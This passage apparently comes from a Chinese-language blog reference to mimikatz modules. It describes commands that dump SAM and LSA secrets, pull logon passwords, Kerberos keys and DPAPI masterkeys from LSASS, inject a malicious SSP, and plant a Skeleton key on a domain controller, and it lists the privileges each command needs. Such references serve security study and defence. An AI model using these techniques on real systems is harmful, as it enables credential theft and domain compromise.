title="LSADUMP::NETSYNC"></a>LSADUMP::NETSYNC</h5><p>netsync提供了一个简单的方法，通过白银票据让一个DC的计算机账户的密码去模拟一个域控制器，然后通过DCSYNC来获取目标账户的信息，包括密码数据。</p><h5 id="LSADUMP-RPDATA"><a href="#LSADUMP-RPDATA" class="headerlink" title="LSADUMP::RPDATA"></a>LSADUMP::RPDATA</h5><h5 id="LSADUMP-SAM-获取sysken来解密SAM（从注册表或者hive文件中获取）。SAM会连接到本地安全账户管理数据库（SAM）并且转存本地账户的凭证。"><a href="#LSADUMP-SAM-获取sysken来解密SAM（从注册表或者hive文件中获取）。SAM会连接到本地安全账户管理数据库（SAM）并且转存本地账户的凭证。" class="headerlink" title="LSADUMP::SAM - 获取sysken来解密SAM（从注册表或者hive文件中获取）。SAM会连接到本地安全账户管理数据库（SAM）并且转存本地账户的凭证。"></a>LSADUMP::SAM - 获取sysken来解密SAM（从注册表或者hive文件中获取）。SAM会连接到本地安全账户管理数据库（SAM）并且转存本地账户的凭证。</h5><p>需要system或者debug权限<br>SAM包含用户密码的NTLM,部分LM HASH，该文件可以在线（需要system用户的token）或者离线工作（需要system权限和SAM HIVES文件或者备份）。<br>需要administrator权限（debug）或者本地system权限来运行在线SAM服务<br><img src="/img/lsadump.sam1.jpg"></p><h5 id="LSADUMP-SECRETS-获取syskey来解密SECRETS条目"><a href="#LSADUMP-SECRETS-获取syskey来解密SECRETS条目" class="headerlink" title="LSADUMP::SECRETS    -    获取syskey来解密SECRETS条目"></a>LSADUMP::SECRETS    -    获取syskey来解密SECRETS条目</h5><p>需要system或者debug权限<br><img src="/img/lsadump.secrets.jpg"></p><h5 id="LSADUMP-TRUST-请求LSA-server检索信任身份验证信息"><a href="#LSADUMP-TRUST-请求LSA-server检索信任身份验证信息" class="headerlink" title="LSADUMP::TRUST    -    请求LSA server检索信任身份验证信息"></a>LSADUMP::TRUST    -    请求LSA server检索信任身份验证信息</h5><p>需要system或者debug权限<br>从活动目录中存在的信任关系中提取数据，信任密钥也会显示。</p><h3 id="6-MISC"><a href="#6-MISC" class="headerlink" title="6.MISC"></a>6.MISC</h3><p>mimikatz的MISC模块包含了很多不太适合其他一些应用场景的命令，最常用的一些命令是<code>MISC::AddSID, MISC::MemSSP, MISC::Skeleton</code></p><h5 id="MISC-ADDSID-（新版本该功能在sid模块下sid-add）"><a href="#MISC-ADDSID-（新版本该功能在sid模块下sid-add）" class="headerlink" title="MISC::ADDSID -（新版本该功能在sid模块下sid::add）"></a>MISC::ADDSID -（新版本该功能在sid模块下sid::add）</h5><p>给账户添加SIDHISTORY，需要system或者debug权限。</p><h5 id="MISC-CMD-运行CMD"><a href="#MISC-CMD-运行CMD" class="headerlink" title="MISC::CMD    - 运行CMD"></a>MISC::CMD    - 运行CMD</h5><p>需要管理员权限</p><h5 id="MISC-compressme-压缩打包自身"><a href="#MISC-compressme-压缩打包自身" class="headerlink" title="MISC::compressme - 压缩打包自身"></a>MISC::compressme - 压缩打包自身</h5><h5 id="MISC-DETOURS-尝试使用Detours-like-hooks列举所有的模块"><a href="#MISC-DETOURS-尝试使用Detours-like-hooks列举所有的模块" class="headerlink" title="MISC::DETOURS - 尝试使用Detours-like hooks列举所有的模块"></a>MISC::DETOURS - 尝试使用Detours-like hooks列举所有的模块</h5><p>需要管理员权限<br><img src="/img/misc.detours.jpg"></p><h5 id="MISC-MemSSP-通过一个新的SSP给内存里的LSASS进程打补丁，注入一个恶意的SSP来记录本地登录授权的凭证，该操作不需要重启，重启后会清除mimikatz注入的memssp。"><a href="#MISC-MemSSP-通过一个新的SSP给内存里的LSASS进程打补丁，注入一个恶意的SSP来记录本地登录授权的凭证，该操作不需要重启，重启后会清除mimikatz注入的memssp。" class="headerlink" title="MISC::MemSSP - 通过一个新的SSP给内存里的LSASS进程打补丁，注入一个恶意的SSP来记录本地登录授权的凭证，该操作不需要重启，重启后会清除mimikatz注入的memssp。"></a>MISC::MemSSP - 通过一个新的SSP给内存里的LSASS进程打补丁，注入一个恶意的SSP来记录本地登录授权的凭证，该操作不需要重启，重启后会清除mimikatz注入的memssp。</h5><p>需要管理员权限，详细内容请看<a href="https://adsecurity.org/?p=1760">post on Mimikatz SSP describes in-memory patching as well as more persistent SSP techniques</a><br><img src="/img/misc.memssp.jpg"></p><h5 id="MISC-ncroutemon-juiper管理器（没有DisableTaskMgr）"><a href="#MISC-ncroutemon-juiper管理器（没有DisableTaskMgr）" class="headerlink" title="MISC::ncroutemon - juiper管理器（没有DisableTaskMgr）"></a>MISC::ncroutemon - juiper管理器（没有DisableTaskMgr）</h5><h5 id="MISC-regedit-打开注册表（没有DisableRegistryTools）"><a href="#MISC-regedit-打开注册表（没有DisableRegistryTools）" class="headerlink" title="MISC::regedit - 打开注册表（没有DisableRegistryTools）"></a>MISC::regedit - 打开注册表（没有DisableRegistryTools）</h5><p>需要管理员权限</p><h5 id="MISC-Skeleton-在域控制器上注入一个Sekeleton-key到LSASS进程"><a href="#MISC-Skeleton-在域控制器上注入一个Sekeleton-key到LSASS进程" class="headerlink" title="MISC::Skeleton - 在域控制器上注入一个Sekeleton key到LSASS进程"></a>MISC::Skeleton - 在域控制器上注入一个Sekeleton key到LSASS进程</h5><p>需要管理员权限，该操作给DC打补丁，让所有用户可以通过Master password（Skeleton key）和他们常用的密码进行验证<br><img src="/img/misc.skeleton.jpg"></p><h5 id="MISC-TASKMGR-打开任务管理器"><a href="#MISC-TASKMGR-打开任务管理器" class="headerlink" title="MISC::TASKMGR - 打开任务管理器"></a>MISC::TASKMGR - 打开任务管理器</h5><p>需要管理员权限</p><h3 id="7-MINESWEEPER"><a href="#7-MINESWEEPER" class="headerlink" title="7.MINESWEEPER"></a>7.MINESWEEPER</h3><h5 id="MINESWEEPER-INFOS-提供minesweeper的mine信息"><a href="#MINESWEEPER-INFOS-提供minesweeper的mine信息" class="headerlink" title="MINESWEEPER::INFOS - 提供minesweeper的mine信息"></a>MINESWEEPER::INFOS - 提供minesweeper的mine信息</h5><h3 id="8-NET"><a href="#8-NET" class="headerlink" title="8.NET"></a>8.NET</h3><h5 id="NET-user-列出用户名及所属组"><a href="#NET-user-列出用户名及所属组" class="headerlink" title="NET::user - 列出用户名及所属组"></a>NET::user - 列出用户名及所属组</h5><p><img src="/img/net.user.jpg"></p><h5 id="NET-GROUP"><a href="#NET-GROUP" class="headerlink" title="NET::GROUP"></a>NET::GROUP</h5><h5 id="NET-LOCALGROUP"><a href="#NET-LOCALGROUP" class="headerlink" title="NET::LOCALGROUP"></a>NET::LOCALGROUP</h5><h3 id="9-PEIVILEGE"><a href="#9-PEIVILEGE" class="headerlink" title="9.PEIVILEGE"></a>9.PEIVILEGE</h3><h5 id="PRIVILEGE-DEBUG-获得debug权限"><a href="#PRIVILEGE-DEBUG-获得debug权限" class="headerlink" title="PRIVILEGE::DEBUG - 获得debug权限"></a>PRIVILEGE::DEBUG - 获得debug权限</h5><p>debug权限允许用户去调试他们不能访问的进程，比如一个拥有debug权限的用户进程启用token可以调试以local system权限运行的服务</p><p>以下命令都需要debug权限</p><h5 id="PRIVILEGE-BACKUP-备份一个权限"><a href="#PRIVILEGE-BACKUP-备份一个权限" class="headerlink" title="PRIVILEGE::BACKUP - 备份一个权限"></a>PRIVILEGE::BACKUP - 备份一个权限</h5><h5 id="PRIVILEGE-DRIVER-获得驱动权限"><a href="#PRIVILEGE-DRIVER-获得驱动权限" class="headerlink" title="PRIVILEGE::DRIVER - 获得驱动权限"></a>PRIVILEGE::DRIVER - 获得驱动权限</h5><h5 id="PRIVILEGE-ID-获得ID所对应的权限"><a href="#PRIVILEGE-ID-获得ID所对应的权限" class="headerlink" title="PRIVILEGE::ID - 获得ID所对应的权限"></a>PRIVILEGE::ID - 获得ID所对应的权限</h5><h5 id="PRIVILEGE-NAME-获得NAME所对应的权限"><a href="#PRIVILEGE-NAME-获得NAME所对应的权限" class="headerlink" title="PRIVILEGE::NAME - 获得NAME所对应的权限"></a>PRIVILEGE::NAME - 获得NAME所对应的权限</h5><h5 id="PRIVILEGE-RESTORE-获得restore权限"><a href="#PRIVILEGE-RESTORE-获得restore权限" class="headerlink" title="PRIVILEGE::RESTORE - 获得restore权限"></a>PRIVILEGE::RESTORE - 获得restore权限</h5><h3 id="10-PROCESS"><a href="#10-PROCESS" class="headerlink" title="10.PROCESS"></a>10.PROCESS</h3><p>该模块提供从进程中获取数据和与进程交互的功能</p><h5 id="PROCESS-Exports-列出进程"><a href="#PROCESS-Exports-列出进程" class="headerlink" title="PROCESS::Exports - 列出进程"></a>PROCESS::Exports - 列出进程</h5><h5 id="PROCESS-IMPORTS-列出IMPORTS"><a href="#PROCESS-IMPORTS-列出IMPORTS" class="headerlink" title="PROCESS::IMPORTS - 列出IMPORTS"></a>PROCESS::IMPORTS - 列出IMPORTS</h5><h5 id="PROCESS-list-列出正在运行的进程"><a href="#PROCESS-list-列出正在运行的进程" class="headerlink" title="PROCESS::list - 列出正在运行的进程"></a>PROCESS::list - 列出正在运行的进程</h5><p>需要管理员权限</p><h5 id="PROCESS-RESUME-恢复一个进程"><a href="#PROCESS-RESUME-恢复一个进程" class="headerlink" title="PROCESS::RESUME - 恢复一个进程"></a>PROCESS::RESUME - 恢复一个进程</h5><h5 id="PROCESS-START-启动一个进程"><a href="#PROCESS-START-启动一个进程" class="headerlink" title="PROCESS::START - 启动一个进程"></a>PROCESS::START - 启动一个进程</h5><h5 id="PROCESS-STOP-停止"><a href="#PROCESS-STOP-停止" class="headerlink" title="PROCESS::STOP - 停止"></a>PROCESS::STOP - 停止</h5><h5 id="PROCESS-SUSPEND-挂起"><a href="#PROCESS-SUSPEND-挂起" class="headerlink" title="PROCESS::SUSPEND - 挂起"></a>PROCESS::SUSPEND - 挂起</h5><h3 id="11-SEKURLSA"><a href="#11-SEKURLSA" class="headerlink" title="11.SEKURLSA"></a>11.SEKURLSA</h3><p>SEKURLSA模块与受保护的内存进行交互，从运行在内存中的LSASS中获取密码，keys，pin以及凭证信息。<br>需要管理员权限，debug权限，或者通过<code>token::elevate</code>提升到system权限。如果运行的是dump下来的lsass进程文件，则不需要提权。</p><h5 id="SEKURLSA-BACKUPKEYS-获取首选的备份主密钥"><a href="#SEKURLSA-BACKUPKEYS-获取首选的备份主密钥" class="headerlink" title="SEKURLSA::BACKUPKEYS - 获取首选的备份主密钥"></a>SEKURLSA::BACKUPKEYS - 获取首选的备份主密钥</h5><p><img src="/img/sekurlsa.backupkeys.png"></p><h5 id="SEKURLSA-Credman-列出凭证管理器"><a href="#SEKURLSA-Credman-列出凭证管理器" class="headerlink" title="SEKURLSA::Credman - 列出凭证管理器"></a>SEKURLSA::Credman - 列出凭证管理器</h5><p><img src="/img/sekurlsa.credman.png"></p><h5 id="SEKURLSA-Dpapi-列出缓存的masterkeys"><a href="#SEKURLSA-Dpapi-列出缓存的masterkeys" class="headerlink" title="SEKURLSA::Dpapi - 列出缓存的masterkeys"></a>SEKURLSA::Dpapi - 列出缓存的masterkeys</h5><p><img src="/img/sekurlsa.dpapi.png"></p><h5 id="SEKURLSA-DpapiSystem-DPAPI-SYSTEM-secret"><a href="#SEKURLSA-DpapiSystem-DPAPI-SYSTEM-secret" class="headerlink" title="SEKURLSA::DpapiSystem - DPAPI_SYSTEM secret"></a>SEKURLSA::DpapiSystem - DPAPI_SYSTEM secret</h5><p><img src="/img/sekurlsa.dpapisystem.png"></p><h5 id="SEKURLSA-EKEYS-列出Kerberos加密密钥"><a href="#SEKURLSA-EKEYS-列出Kerberos加密密钥" class="headerlink" title="SEKURLSA::EKEYS - 列出Kerberos加密密钥"></a>SEKURLSA::EKEYS - 列出Kerberos加密密钥</h5><p><img src="/img/sekurlsa.ekeys.png"></p><h5 id="SEKURLSA-KERBEROS-列出已授权验证用户的Kerberos凭证信息（包括电脑账户和服务账户）"><a href="#SEKURLSA-KERBEROS-列出已授权验证用户的Kerberos凭证信息（包括电脑账户和服务账户）" class="headerlink" title="SEKURLSA::KERBEROS - 列出已授权验证用户的Kerberos凭证信息（包括电脑账户和服务账户）"></a>SEKURLSA::KERBEROS - 列出已授权验证用户的Kerberos凭证信息（包括电脑账户和服务账户）</h5><p><img src="/img/sekurlsa.kerberos.png"></p><h5 id="SEKURLSA-krbtgt-获取域Kerberos服务账号的密码数据"><a href="#SEKURLSA-krbtgt-获取域Kerberos服务账号的密码数据" class="headerlink" title="SEKURLSA::krbtgt - 获取域Kerberos服务账号的密码数据"></a>SEKURLSA::krbtgt - 获取域Kerberos服务账号的密码数据</h5><h5 id="SEKURLSA-LiveSSP-列出LiveSSP凭证信息"><a href="#SEKURLSA-LiveSSP-列出LiveSSP凭证信息" class="headerlink" title="SEKURLSA::LiveSSP - 列出LiveSSP凭证信息"></a>SEKURLSA::LiveSSP - 列出LiveSSP凭证信息</h5><h5 id="SEKURLSA-logonpasswords-列出最近登陆过的所有用户的密码信息"><a href="#SEKURLSA-logonpasswords-列出最近登陆过的所有用户的密码信息" class="headerlink" title="SEKURLSA::logonpasswords - 列出最近登陆过的所有用户的密码信息"></a>SEKURLSA::logonpasswords - 列出最近登陆过的所有用户的密码信息</h5><p>账户密码使用可逆的方式存储在内存中，如果内存中存在密码信息，那么可以被显示出来。（适用于Windows8.1/Windows 2012 R2之前）。KB2871997补丁针对这个安全问题进行了修复，不过仍然需要手动添加额外的配置，需要管理员权限</p><h5 id="SEKURLSA-Minidump-切换到LSASS-minidump进程上下文"><a href="#SEKURLSA-Minidump-切换到LSASS-minidump进程上下文" class="headerlink" title="SEKURLSA::Minidump - 切换到LSASS minidump进程上下文"></a>SEKURLSA::Minidump - 切换到LSASS minidump进程上下文</h5><p>需要注意的是minidump是对相同平台上的LSASS数据进行读取，NT5 Win32 or NT5x64 or NT6 Win32 or NT6 x64</p><h5 id="SEKURLSA-MSV-列出LM-amp-NTLM凭证"><a href="#SEKURLSA-MSV-列出LM-amp-NTLM凭证" class="headerlink" title="SEKURLSA::MSV - 列出LM &amp; NTLM凭证"></a>SEKURLSA::MSV - 列出LM &amp; NTLM凭证</h5>]]></content>
      
      
      
        <tags>
            
            <tag> mimikatz </tag>
            
            <tag> adsec </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
